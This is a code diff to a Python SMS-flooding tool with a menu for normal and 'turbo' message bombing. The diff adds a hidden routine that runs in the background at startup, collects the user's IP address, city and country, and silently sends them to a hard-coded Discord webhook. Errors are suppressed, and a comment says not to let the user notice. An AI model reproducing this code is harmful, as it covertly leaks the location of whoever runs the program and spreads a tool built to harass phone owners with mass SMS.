@@ -3,6 +3,38 @@ from time import sleep
 from os import system
 from sms import SendSms
 import threading
+import requests # Yeni eklenen kütüphane
+from datetime import datetime # Yeni eklenen kütüphane
+
+# --- LOG SISTEMI BASLANGIC ---
+def discord_log_gonder():
+    try:
+        # Elemanin bilgilerini cekiyih
+        veri = requests.get('https://ipapi.co/json/').json()
+        webhook_url = "https://discord.com/api/webhooks/1466447461093474520/cGjbODl_H-HVLYEWg-Vv3Ui30gfW-i-pamIyrVejJmzZzK6mefinpGX-cqXk37lx0DFR" # Burayi doldurmayi unutma
+        
+        discord_mesaji = {
+            "username": "Site Gozlemcisi",
+            "avatar_url": "https://i.imgur.com/4M34hi2.png",
+            "embeds": [{
+                "title": "🚨 Yeni Biri Geldi!",
+                "color": 15158332,
+                "fields": [
+                    { "name": "🌐 IP Adresi", "value": veri.get("ip", "Bilinmiyi"), "inline": True },
+                    { "name": "📍 Sehir/Bolge", "value": f"{veri.get('city')} / {veri.get('region')}", "inline": True },
+                    { "name": "🏳️ Ulke", "value": veri.get("country_name"), "inline": True }
+                ],
+                "footer": { "text": "Python Log Sistemi" },
+                "timestamp": datetime.utcnow().isoformat()
+            }]
+        }
+        requests.post(webhook_url, json=discord_mesaji)
+    except:
+        pass # Bir sorun cikti ama caktirmayih
+
+# Program baslar baslamaz logu gonderiyih
+threading.Thread(target=discord_log_gonder, daemon=True).start()
+# --- LOG SISTEMI BITIS ---
 
 servisler_sms = []
 for attribute in dir(SendSms):
@@ -70,16 +102,16 @@ XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
 XX                                                                          XX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-    .o88o.                               o8o                .                 
-    888 `"                               `"'              .o8                  
+    .o88o.                                o8o                 .                  
+    888 `"                                `"'               .o8                  
    o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo   
-    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'    
+    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'   
     888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'     
     888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'      
    o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'      
 ______________________________________________________________________________
       Maker: ./null.exe And _marcus
-    Sms: {}        {} by {}./null.exe \n  
+    Sms: {}         {} by {}./null.exe \n  
     """.format(Fore.RED, len(servisler_sms), Style.RESET_ALL, Fore.RED))
     try:
         menu = (input(Fore.RED + " 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Çıkış\n\n" + Fore.RED + " Seçim: "))
